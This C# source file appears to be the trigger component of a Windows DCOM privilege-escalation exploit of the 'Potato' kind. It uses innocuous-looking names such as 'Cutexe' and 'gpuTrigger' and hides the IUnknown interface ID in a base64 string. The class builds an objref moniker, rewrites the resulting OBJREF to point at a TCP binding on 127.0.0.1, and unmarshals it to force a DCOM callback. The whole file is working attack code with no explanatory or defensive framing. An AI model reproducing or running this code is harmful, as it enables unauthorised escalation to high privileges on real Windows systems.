using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace Cutexe.NativeAPI{

    [ComVisible(true)]
    public class gpuTrigger  {
        private static readonly string base64Guid = "ezAwMDAwMDAwLTAwMDAtMDAwMC1DMDAwLTAwMDAwMDAwMDA0Nn0=";
        private static readonly Guid iidUnk = new Guid(
            Encoding.UTF8.GetString(Convert.FromBase64String(base64Guid))
        );
        private readonly static string binding = "127.0.0.1";
        private readonly static TowerProtocol tpPro = TowerProtocol.EPM_PROTOCOL_TCP;


        public object reallyObj = new object();
        public IntPtr pIUnknown;
        public IBindCtx bindCtx;
        public IMoniker moniker;

        private CutexeContext gpContext;

        public gpuTrigger(CutexeContext gpContext) {
            this.gpContext = gpContext;


            if (!gpContext.IsStart)
            {
                throw new Exception("Cutexe was not initialized");
            }

            pIUnknown = Marshal.GetIUnknownForObject(reallyObj);
            NativeMethods.CreateBindCtx(0, out bindCtx);
            NativeMethods.CreateObjrefMoniker(pIUnknown, out moniker);

        }

        public int GetReadyToOpen() {

            string pDispName;
            moniker.GetDisplayName(bindCtx, null, out pDispName);
            pDispName = pDispName.Replace("objref:", "").Replace(":", "");
            byte[] objrefBytes = Convert.FromBase64String(pDispName);

            ObjRef tmpRRR = new ObjRef(objrefBytes);

            gpContext.ConsoleWriter.WriteLine("[*] public table : 0x{0:x}", tmpRRR.StandardObjRef.PublicRefs);

            ObjRef objRef = new ObjRef(iidUnk,
                  new ObjRef.Standard(0, 1, tmpRRR.StandardObjRef.OXID, tmpRRR.StandardObjRef.OID, tmpRRR.StandardObjRef.IPID,
                    new ObjRef.DualStringArray(new ObjRef.StringBinding(tpPro, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));
            byte[] data = objRef.GetBytes();

            IntPtr ppv;

            return UnmarshalDCOM.UnmarshalObject(data,out ppv);
        }


    }
}
